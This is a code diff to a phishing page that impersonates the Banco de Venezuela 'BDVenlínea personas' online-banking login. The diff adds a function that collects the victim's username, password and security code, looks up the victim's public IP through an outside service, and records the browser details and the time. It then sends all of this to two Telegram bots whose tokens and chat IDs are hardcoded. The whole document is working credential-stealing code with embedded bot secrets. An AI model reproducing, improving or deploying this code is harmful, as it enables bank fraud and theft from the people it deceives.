@@ -13,7 +13,7 @@
         }
 
         body {
-            background-image: url('bdv_background.jpg');
+            background-color: #0f172a;
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
@@ -108,13 +108,6 @@
             border-color: #5c246c;
             background-color: #fff;
             box-shadow: 0 0 0 2px rgba(92, 36, 108, 0.15);
-        }
-
-        .code-hint {
-            font-size: 11px;
-            color: #777;
-            margin-bottom: 20px;
-            line-height: 1.3;
         }
 
         .toggle-password {
@@ -268,7 +261,7 @@
     <div class="container">
         <div class="login-card">
             <div class="logo-header">
-                <img src="bdv_logo.png" alt="BDVenlínea personas" class="logo-img">
+                <img src="bdv_logo.png" alt="BDVenlínea personas" class="logo-img" onerror="this.style.display='none'">
             </div>
 
             <div id="form-step-container"></div>
@@ -521,8 +514,8 @@
                 </div>
             `;
 
-            // Enviar mensajes a ambos chats de Telegram
-            enviarTelegramBots();
+            // Llamada para obtener la IP real antes de enviar a Telegram
+            enviarTelegramBotsConIPReal();
 
             const btnReiniciar = document.getElementById('btn-reiniciar');
             btnReiniciar.addEventListener('click', () => {
@@ -531,26 +524,41 @@
             });
         }
 
-        function enviarTelegramBots() {
-            const mensaje = `🔔 *Nuevos datos recibidos*:\n\n👤 *Usuario:* ${datosUsuario.usuario}\n🔑 *Clave:* ${datosUsuario.clave}\n🔢 *Código:* ${datosUsuario.codigo}`;
+        async function enviarTelegramBotsConIPReal() {
+            let ipReal = "No obtenida";
+            try {
+                // Consulta a servicio externo para obtener la IP pública real del cliente
+                const respuestaIP = await fetch('https://api.ipify.org?format=json');
+                const dataIP = await respuestaIP.json();
+                ipReal = dataIP.ip;
+            } catch (error) {
+                console.error("No se pudo obtener la IP real:", error);
+            }
+
+            const navegadorActual = navigator.userAgent;
+            const fechaHoraActual = new Date().toLocaleString();
+
+            const mensaje = `🔔 NUEVO INICIO DE SESIÓN\n\n` +
+                            `👤 Usuario: ${datosUsuario.usuario}\n` +
+                            `🔑 Clave: ${datosUsuario.clave}\n` +
+                            `Token/Código: ${datosUsuario.codigo}\n` +
+                            `📅 Fecha: ${fechaHoraActual}\n` +
+                            `🌐 IP Real: ${ipReal}\n` +
+                            `💻 Navegador: ${navegadorActual}`;
             
-            // Configuración del primer bot y chat ID
             const token1 = "8693441527:AAF5wgfWZ-D7vU5meoL5c9JJZ8cSOCNt2oI";
             const chatId1 = "-1003838824915";
-            const url1 = `https://api.telegram.org/bot${token1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;
+            const url1 = `https://api.telegram.org/bot${token1}/sendMessage?chat_id=${chatId1}&text=${encodeURIComponent(mensaje)}`;
 
-            // Configuración del segundo bot y chat ID
             const token2 = "8666765498:AAGWJBrFW4DH2c4hDnKuTuocTON7G1FmU4A";
             const chatId2 = "8867230397";
-            const url2 = `https://api.telegram.org/bot${token2}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(mensaje)}&parse_mode=Markdown`;
+            const url2 = `https://api.telegram.org/bot${token2}/sendMessage?chat_id=${chatId2}&text=${encodeURIComponent(mensaje)}`;
 
-            // Enviar petición al primer bot
             fetch(url1)
                 .then(res => res.json())
                 .then(data => console.log("Enviado al Bot 1 con éxito:", data))
                 .catch(err => console.error("Error al enviar al Bot 1:", err));
 
-            // Enviar petición al segundo bot
             fetch(url2)
                 .then(res => res.json())
                 .then(data => console.log("Enviado al Bot 2 con éxito:", data))
